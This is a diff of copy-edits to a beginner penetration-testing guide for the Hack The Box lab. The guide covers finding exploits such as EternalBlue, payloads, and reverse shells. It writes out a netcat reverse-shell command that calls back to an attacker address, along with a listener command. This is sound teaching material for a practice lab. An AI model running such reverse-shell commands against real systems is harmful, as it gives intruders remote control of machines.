@@ -29,7 +29,7 @@ description: >-
 
 In case you decided to skip the preparation stages, [Hackthebox](https://www.hackthebox.eu/invite) is the platform we will be using in this guide to allow you to practice your hacking skills.
 
-Hacking machines on Hackthebox is somewhat similar to hacking in the real world. The HTB lab conssits of a gret chunk of independent boxes that are not connected to each other. That means each machine must be hacked individually. **The main goal of "hacking" is to gain command line / terminal access to the target machine with the highest privilege possible**. We usually achieve some form of command line access to target through what is called "code execution". That means you have found a way to execute arbitrary code on the target and hence you can start taking control over it. 
+Hacking machines on Hackthebox is somewhat similar to hacking in the real world. The HTB lab consiats of a number of independent boxes that are not connected to each other. That means each machine must be hacked individually. **The main goal of "hacking" is to gain command line / terminal access to the target machine with the highest privilege possible**. We usually achieve some form of command line access to target through what is called "code execution". That means you have found a way to execute arbitrary code on the target and hence you can start taking control over it. 
 
 Usually, you gain access as a user or service account. The next challenge then becomes to escalate your privileges to the highest possible level. That means, if you are a regular user or a service account, you want to become administrator. Another flag is made available only through access with this level of privilege.
 
@@ -37,11 +37,11 @@ For each machine there is a flag that proves you have gained access to the machi
 
 #### Submitting flags on Hackthebox
 
-After you have successfully compromised and gained access to a box, and found the flags, they must be submitted by pressing the two icons on the right in the machines panel on HTB. Flags provde that you completed the box and for each flag you get a certain amount of points, depending on the difficulty of the machine. Some boxes are built in such a way that compromising them might give you administrative access straight away. If so, you can grab both flags, because with administrative privileges we have full access to everything on the machine. 
+After you have successfully compromised and gained access to a box, and found the flags, they must be submitted by pressing the two icons on the right in the machines panel on HTB. Flags provde that you completed the box and for each flag you get a certain number of points, depending on the difficulty of the machine. Some boxes are built in such a way that compromising them might give you administrative access straight away. If so, you can grab both flags, because with administrative privileges we have full access to everything on the machine. 
 
 ![The two rightmost buttons on each machine opens a flag submission panel](.gitbook/assets/image%20%2811%29.png)
 
-Depending on whether the operating system is Windows or Linux, the flags on the machines are usually located in the places listed below. The `<username>` is the username of theu ser on the machine, which  is different on all the boxes. The Administrator user is usually not renamed, but it can happen that flaggs are hidden, so beware. 
+Depending on whether the operating system is Windows or Linux, the flags on the machines are usually located in the places listed below. The `<username>` is the username of theu ser on the machine, which  is different on all the boxes. The Administrator user is usually not renamed, but it can happen that flags are hidden, so beware. 
 
 **Windows**
 
@@ -68,7 +68,7 @@ This is a highly simplified approach to hacking invidiual boxes with four major 
 
 **Tools** - ****Nmap, web browser
 
-**First things first -** Read carefully and write down everything you see on the screen. This may sound a bit weird, but we truly want you to write down any name, software, technology, email address or unknown factor that you discover when hacking. **The devil is the details**. The fact that you did not write down the name of that piece of software may lead you to an abrupt halt later down the road.
+**First things first -** Read carefully and write down everything you see on the screen. This may sound a bit weird, but we truly want you to write down any name, software, technology, email address or unknown factor that you discover when hacking. **The devil is in the detail**. The fact that you did not write down the name of that piece of software may lead you to an abrupt halt later down the road.
 
 ### F**ind IP address, open ports and services**
 
@@ -137,25 +137,25 @@ You want to learn as much as possible about the target and its services. If you 
 
 ### Finding vulnerabilities and exploits
 
-Now that we know what ports are open and what services these oprt signify, let's try to see if any of them have public vulnerabilities and/or exploits.
+Now that we know what ports are open and what services these port signify, let's try to see if any of them have public vulnerabilities and/or exploits.
 
 As an example, lets have a look at the very famous EternalBlue vulnerability and exploit, named MS17-010. We will have a look at some common internet sources to learn more about this.
 
 #### CVE-Details
 
-CVE is a system for categorizing and  scoring the severity of vunlerabliities. The website CVE-details provides us with this information. This is what the Eternalblue vulneraility looks like on CVE-details. As you can see it has quite a high CVSS score, which usually means it can be easily exploited. Also, there are direct links to Metasploit modules, which is a good sign. That means there are prepared exploits for it available for you to use. Metasploit is a framework that contains tool for very easy hacking of machines. We are getting into Metasploit very soon, so just keep readnig.
+CVE is a system for categorizing and scoring the severity of vunlerabliities. The website CVE-details provides us with this information. This is what the Eternalblue vulneraility looks like on CVE-details. As you can see it has quite a high CVSS score, which usually means it can be easily exploited. Also, there are direct links to Metasploit modules, which is a good sign. That means there are prepared exploits for it available for you to use. Metasploit is a framework that contains tool for very easy hacking of machines. We are getting into Metasploit very soon, so just keep reading.
 
 ![CVE-details for MS17-010, also known as EternalBlue](https://lh3.googleusercontent.com/v0mes2e-SCdJ45hLaJLpbbIykdTHGn2orgOJ58Xw9-IAmaBXD4cQgJgoLdyS5D_iZ5zddMD-Fl2mYpF-ORWIrV-JQgEDRuA4auKUoY3sNI5ljr6UgeyF67vPAwiehnl7OyUQXK2jUsM)
 
 #### Rapid7
 
-Rapid7 is the company that writes the Metasploit modules for thousands of exploits over the years, preparing them into a framework that is super easy to use. If you stumble upon an exploit and it has an associated Metasploit module you can rest assured its been tested and is legit. Here we can see how MS17-010 looks on Rapid7's own site. You may not understand the actual details of the exploit. Don't worry! Very few do, and you will soon discover it is possible to hack without understanding every sinlge detail.
+Rapid7 is the company that writes the Metasploit modules for thousands of exploits over the years, preparing them into a framework that is super easy to use. If you stumble upon an exploit and it has an associated Metasploit module you can rest assured it's been tested and is legit. Here we can see how MS17-010 looks on Rapid7's own site. You may not understand the actual details of the exploit. Don't worry! Very few do, and you will soon discover it is possible to hack without understanding every single detail.
 
 ![Rapid7 Metasploit module for MS17-010](https://lh3.googleusercontent.com/e3inunv4NBLXBlcP-LgDfEuTSpmRWEAoPlnM08CiA-jHPIDVccVIf2Q8JkcxDQocKw6eiMUvkP5RLREzpPXt_DAcpsB6Dxv9rRU3pM9hvQnXrWP2kexxDNC7x5vTSl3Y1uV1b5RIOic)
 
 #### Exploit-DB
 
-Let's go back to CVE-details and have a look at the manual exploit too. Sometimes, a Metasploit module is not necessarily the best choice and as a hacker you should strive to try exploiting boxes using both manual and automatic tools.
+Let's go back to CVE-details and have a look at the manual exploit. Sometimes, a Metasploit module is not necessarily the best choice and as a hacker you should strive to try exploiting boxes using both manual and automatic tools.
 
 ![Original exploit for MS17-010 on Exploit-DB](https://lh6.googleusercontent.com/hTd9RIUcQxb0qalEJG0R9ZoeLmM-i9-vKXrSB0dyUV1arnK1Q9oTOhkiiXrvHhn6L8eOyi_6WWmkhTxVR-iTZ4a7ozO8Ngq6QA2CziPfu5sYvw8tGlYOlOCrmTik1aPOqXFmwKxkW78)
 
@@ -183,7 +183,7 @@ In this step we have enumerated a target, we have found an open port with a vuln
 
 Before we move on it's important to know what a payload is. The payload is the actual information in a transmission, in our case it's a script that will provide us with some sort of reverse shell on the target.
 
-Your payload is quite simply whatever code you decide to execute on the machine. It can be something simple, or it can be advanced. However, as we are hackers we want to take full advantage of the fact that we can execute commands on the target. So what we want to do is: **make the target machine connect back to our machine to get what we call a 'shell'.** Why do we want to do this? Because, when we have command execution on the remote box we can make it execute commands to make it connect back to us. However, the other way won't work because its not configured to accept a connection to establish a shell. Therefore in the illustration below, what's called a "normal shell" isn't possible, but since we control the 'client' part which is our Kali box we can open a port and make the server/target machine connect back. This way, we establish a connection where we can interact with the target.
+Your payload is quite simply whatever code you decide to execute on the machine. It can be something simple or it can be advanced. However, as we are hackers we want to take full advantage of the fact that we can execute commands on the target. So what we want to do is: **make the target machine connect back to our machine to get what we call a 'shell'.** Why do we want to do this? Because, when we have command execution on the remote box we can execute commands to make it connect back to us. However, the other way won't work because its not configured to accept a connection to establish a shell. Therefore in the illustration below, what's called a "normal shell" isn't possible, but since we control the 'client' part which is our Kali box we can open a port and make the server/target machine connect back. This way, we establish a connection where we can interact with the target.
 
 To read more about payloads, visit:
 
@@ -191,7 +191,7 @@ To read more about payloads, visit:
 
 ### **So, what's a reverse shell?**
 
-A reverse shell is the target host connecting back to our host! It sounds weird, but that's what we use the exploit for, we get past the defenses of the target host to deliver our payload - malicious code that leverage tools already on the system to connect back to our Kali Linux box. So how do we know that the target host is connecting back? How do we "catch" our shell?
+A reverse shell is the target host connecting back to our host! It sounds weird, but that's what we use the exploit for, we get past the defenses of the target host to deliver our payload - malicious code that leverages tools already on the system to connect back to our Kali Linux box. So how do we know that the target host is connecting back? How do we "catch" our shell?
 
 ![Reverse shell vs bind shell \(normal shell\)](https://lh4.googleusercontent.com/_u5bfPsl_tFbfHvQztajcQg9Xej7SOu7y3Cu3RTBJ5RGDzZAUQdt474UFHeN4_MOmbiO1iiPbDiHnU_NmuZIaHhwjFr-HLVic23LhqiaXElqS8oNh_vDkRw3cwOkcgmNYUn1-n1BiWg)
 
@@ -203,13 +203,13 @@ An important concept in the world of hacking is listeners. Whenever we execute a
 nc 10.10.14.18 4444 -e /bin/sh
 ```
 
-This executes netcat and connects to the IP address 10.10.14.18 on the port 4444, executing `/bin/sh` - one of the many shells on the linux system. If we did this without a listener, nothing would happen. We need something listening on our host with IP 10.10.14.18 on the port 4444. For this we use the following command:
+This executes netcat and connects to the IP address 10.10.14.18 on the port 4444, executing `/bin/sh` - one of the many shells on the linux system. If we did this without a listener nothing would happen. We need something listening on our host with IP 10.10.14.18 on the port 4444. For this we use the following command:
 
 ```text
 nc -lvp 4444
 ```
 
-The -l is for listener, -v is for verbose and the -p is for port. Consequently this command starts a listener on your Kali machine on port 4444. Whenever the payload tries to connect to your IP address on this port with `nc` or a payload, it will "catch" the shell and you will get a terminal on the target. From there you are able to execute commands on the target. See the figure below for a basic example on how this works.
+The -l is for listener, -v is for verbose and the -p is for port. This command starts a listener on your Kali machine on port 4444. Whenever the payload tries to connect to your IP address on this port with `nc` or a payload, it will "catch" the shell and you will get a terminal on the target. From there you are able to execute commands on the target. See the figure below for a basic example on how this works.
 
 ![Basic reverse shell and listener example](.gitbook/assets/image%20%2850%29.png)
 
@@ -319,7 +319,7 @@ Usually these exploit modules come with a premade payload, but we can also modif
 
 ### I have a shell, what now? 
 
-This is the time to start a new round of enumeration. You need to figure out where you are on a machine, who you are and starting working out a way to escalate your privileges. In certain cases it might not even be necessary, because you are already Administrator. The below list is not exahustive by any means and you will find more details about this subject in [Part 4 - Privilege escalation](part-4-privilege-escalation.md).
+This is the time to start a new round of enumeration. You need to figure out where you are on a machine, who you are, and start working out a way to escalate your privileges. In certain cases it might not even be necessary, because you are already Administrator. The below list is not exahustive by any means and you will find more details about this subject in [Part 4 - Privilege escalation](part-4-privilege-escalation.md).
 
 The `whoami` command displays what user you have access as.
 
@@ -346,7 +346,7 @@ So how does this help us to escalate our privileges? It might not directly, but 
 
 **What are we looking for?**
 
-First and foremost to find out as much about the target system as possible. This will vary based on the targets operating system, but  there are some common denominators, such as:
+First and foremost to find out as much about the target system as possible. This will vary based on the target's operating system, but  there are some common denominators, such as:
 
 * What version is the operating system running?
 * Which services are running?
